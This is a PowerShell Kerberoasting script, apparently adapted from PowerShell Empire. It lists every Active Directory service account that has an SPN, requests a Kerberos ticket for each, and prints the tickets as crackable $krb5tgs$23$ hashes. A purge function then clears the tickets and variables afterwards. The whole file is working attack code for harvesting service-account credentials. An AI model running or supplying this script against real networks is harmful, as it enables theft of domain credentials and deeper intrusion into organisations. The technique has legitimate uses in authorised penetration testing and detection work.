# Thanks to PowershellEmpire, ADSecurity.org and Shellster which is where parts of this code originated from
Function Convert-ToHash($Ticket){
    $TicketHashes=@()
    $TicketBytes = $Ticket.GetRequest()
    if ($TicketBytes)
    {
        #Remove the "-"'s
        $TicketHexStream = [System.BitConverter]::ToString($TicketBytes) -replace '-'
        #$TicketHexStream

        [System.Collections.ArrayList]$cutTicket = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split 'A48201'
        $cutTicket.RemoveAt($cutTicket.Count - 1)       
        $Hash = $cutTicket -join 'A48201'
        $Hash = $Hash.Insert(32, '$')
        
        $ThisHash = "`$krb5tgs`$23`$**`$" + $Hash
        $TicketHashes +=  $ThisHash 

        Write-Host -ForegroundColor Red "[*] " -NoNewline
        write-host "Hash++`n$ThisHash"
    }
}

function Purge-TicketInfo(){
    Klist purge

    Get-Variable ticket*,*hash*,*ServiceAccountSPNs*,KerberosTickets* | Remove-Variable -ErrorAction SilentlyContinue
    $KerberosTickets = ""
    Get-Variable KerberosTickets | Remove-Variable -Scope Global
}

<#

.Synopsis
  Request Kerberos tickets from all SPN's
.DESCRIPTION
   Request Kerberos tickets from all SPN's or from a seleted SPN
.EXAMPLE
   Get-KerberosTickets -all
.EXAMPLE
   Get-KerberosTickets -SPN http/Server:80
#>
function Get-KerberosTickets{
    [cmdletBinding(DefaultParameterSetName = 'ALL')]
    Param(
        [Parameter(Position = 0,ParameterSetName = 'All', Mandatory = $True, ValueFromPipeline = $True)]
        [switch]$All, 

        [Parameter(Position = 0,ParameterSetName = 'SPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [string]$SPN     
    )   

    if($all){ $SPNstring = '*' }
    elseif($SPN){$SPNstring = $SPN}

    Write-Host -ForegroundColor Green "[+] " -NoNewline
    Write-Host "Retrieving SPNs from ActiveDirectory"

    [array]$ServiceAccounts = Get-ADUser -filter { ServicePrincipalName -like $SPNstring } -property *  

    $ServiceAccountSPNs = @()

    foreach($ServiceAccountsItem in $ServiceAccounts)
    { 
        foreach($ServiceAccountsItemSPN in $ServiceAccountsItem.ServicePrincipalName)
        {           
            [array]$ServiceAccountSPNs += "$ServiceAccountsItemSPN"#,"$($ServiceAccountsItem.SamAccountName)"
        }
    }  

    # Not really needed
    # Klist purge   

    Write-Host -ForegroundColor Green "[+] " -NoNewline
    Write-Host "Kerberoasting" 

    $Global:KerberosTickets = @()
    
    foreach($ServiceAccountSPNItem in $ServiceAccountSPNs)
    {
        Try
        {
            Write-Host -ForegroundColor Yellow "[+] " -NoNewline
            Write-Host "SPN: $ServiceAccountSPNItem "      

            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $ServiceAccountSPNItem
            $Ticket

            $Global:KerberosTickets += $Ticket           

            Convert-ToHash($ticket)
        }

        catch [exception]
        {
            #$_.Exception.InnerException.InnerException.message
        }
    }   

    Write-Host -ForegroundColor Green "`n`n[+] " -NoNewline
    Write-Host "View tickets in memory [ C:\Klist ]`n"

    Write-Host -ForegroundColor Red "[*] " -NoNewline
    write-host "Don't forget to Purge your tickets [ C:\Klist purge ]"

    Write-Host -ForegroundColor Red "[*] " -NoNewline
    write-host "Purge All Ticket Info: Purge-TicketInfo"
} 
